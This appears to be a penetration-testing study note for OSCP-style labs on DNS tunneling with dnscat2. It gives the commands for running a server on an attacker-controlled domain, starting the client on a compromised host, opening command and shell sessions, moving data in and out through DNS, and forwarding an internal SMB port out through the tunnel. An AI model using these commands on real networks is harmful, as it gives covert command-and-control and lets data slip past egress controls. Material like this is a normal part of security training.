# DNS Tunneling — dnscat2

Use **DNS tunneling when a compromised host has very restricted outbound connectivity but DNS resolution still works**. DNS queries may be forwarded by an internal recursive resolver to an authoritative DNS server you control, allowing data and tunneled TCP traffic to cross the boundary.

## Quick decision

```text
Normal pivot traffic blocked
  ├─ HTTP/WebSocket allowed → [[Chisel]]
  └─ only DNS resolution escapes → dnscat2
```

## Mental model

```text
Compromised host
   ↓ DNS query
Internal DNS resolver
   ↓ recursive lookup
Authoritative DNS server you control
   ↓
dnscat2-server
```

The internal host does **not** need direct connectivity to your server if its resolver can reach your authoritative DNS server.

### Data direction

- **Exfiltration:** encode data in DNS subdomain queries such as `<encoded-chunk>.example.com`.
- **Infiltration:** return data inside DNS records such as **TXT** records.
- dnscat2 automates this and can transport TCP sessions through DNS queries/responses.

## Check DNS on the compromised Linux host

```bash
resolvectl status
nslookup example.com
```

Ubuntu may show `127.0.0.53` because `systemd-resolved` is the local stub resolver; it forwards to the configured upstream DNS server.

If cached responses interfere:

```bash
resolvectl flush-caches
```

Test a specific resolver directly if needed:

```bash
nslookup test.<YOUR_DOMAIN> <DNS_SERVER_IP>
```

## dnscat2 setup

### 1. Authoritative server — start dnscat2-server

Your domain/zone must ultimately resolve to the server running dnscat2.

```bash
dnscat2-server <YOUR_DOMAIN>
```

Example:

```bash
dnscat2-server tunnel.example.com
```

The server listens on UDP/53 and prints a suggested client command and optional shared secret.

### 2. Compromised host — start the client

```bash
./dnscat <YOUR_DOMAIN>
```

With a pre-shared secret:

```bash
./dnscat --secret=<SECRET> <YOUR_DOMAIN>
```

If direct UDP/53 connectivity to the server is possible, dnscat2 can also target it explicitly:

```bash
./dnscat --dns server=<SERVER_IP>,port=53 --secret=<SECRET>
```

For the recursive-resolver bypass scenario, use the **domain-based** method so the client's normal DNS path carries the tunnel.

## Verify the session

Server console:

```text
dnscat2> windows
```

Attach to the command session:

```text
dnscat2> window -i <ID>
```

If no pre-shared secret is used, compare the authentication phrase shown by both client and server. **Encrypted but NOT validated** means encryption is active, but peer identity has not been confirmed.

Optional packet verification:

```bash
sudo tcpdump -i <INTERFACE> udp port 53
```

Expect many TXT/CNAME/MX-style DNS queries. This is useful for troubleshooting, but DNS tunneling is **slow and noisy**, not stealthy.

## Port forwarding through dnscat2

Inside the attached dnscat2 command session:

```text
listen [<LHOST>:]<LPORT> <RHOST>:<RPORT>
```

This behaves similarly to SSH `-L`: a port on the dnscat2 server side forwards through the DNS tunnel and exits from the compromised client side.

Example — expose internal SMB locally:

```text
command (...)> listen 127.0.0.1:4455 172.16.2.11:445
```

Then from the dnscat2 server:

```bash
smbclient -p 4455 -L //127.0.0.1 -U user
```

Traffic flow:

```text
smbclient → 127.0.0.1:4455
          → dnscat2 server
          → DNS tunnel (UDP/53)
          → compromised dnscat2 client
          → 172.16.2.11:445
```

## Useful dnscat2 session commands

```text
windows                 # list sessions/windows
window -i <ID>          # interact with a session
?                       # command help
listen ...              # TCP port forward
shell                    # request shell functionality if supported
upload / download       # transfer data through the tunnel
```

## OSCP notes / limitations

- Requires **command execution** on the compromised host first; DNS tunneling is a transport mechanism, not the initial exploit.
- For the classic recursive-DNS technique, you normally need control of an **authoritative DNS domain/zone**.
- DNS tunnels have low bandwidth and generate many unusual queries.
- Confirm the target's configured resolver and test that queries for your domain actually reach your authoritative server before troubleshooting dnscat2 itself.
- Prefer a simpler/ faster tunnel (Ligolo, SSH, Chisel) when normal outbound traffic is available; use DNS when egress controls force you to.

See also:
- [[Intro]]
- [[Chisel]]
- [[SSH Tunneling]]
